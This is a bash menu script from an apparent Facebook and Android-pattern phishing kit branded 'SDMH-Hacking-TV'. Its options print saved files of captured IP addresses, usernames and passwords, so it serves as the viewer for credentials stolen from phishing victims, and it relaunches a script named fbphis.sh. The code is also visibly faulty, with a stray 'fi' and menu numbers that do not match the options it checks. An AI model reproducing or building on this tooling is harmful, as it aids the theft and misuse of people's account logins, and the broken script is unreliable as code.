clear
toilet -f mono12 -F gay "AIOP"
echo ""
echo -e "\e[96m----------------- SDMH-Hacking-TV 2021--------\e[0m";
echo -e "\e[95m----------- FB Phis and Android Pattern Hack ----------\e[0m";
echo -e "\e[93m-------------- Facebook - SDMH-Hacking-TV ------\e[0m";
echo ""
echo -e "\e[94m# CODED BY ISURUWA\e[0m";
echo ""
echo -e "\e[91m1.Facebook\e[0m";
echo -e "\e[96m23.Android Pattern\e[0m";
echo -e "\e[92m22.Facebook\e[0m";
echo -e "\e[92m22.Youtube\e[0m";
echo -e "00.Back";
echo -e "";
read -p 'Enter Your Option 》' userinput1;
#
if [ "${userinput1:-}" = "1" ]
then
	cd source/saved/facebook
	cat ip.txt
	cat usernames.txt
	cat password.txt
fi

fi
if [ "${userinput1:-}" = "2" ]
then
	cd source/saved/pattern
	cat ip.txt 
	cat usernames.txt
	cat password.txt 

fi
if [ "${userinput1:-}" = "00" ]
then
	bash fbphis.sh 

fi

read -p 'Press enter to continue 》' userinput1;
#
bash fbphis.sh
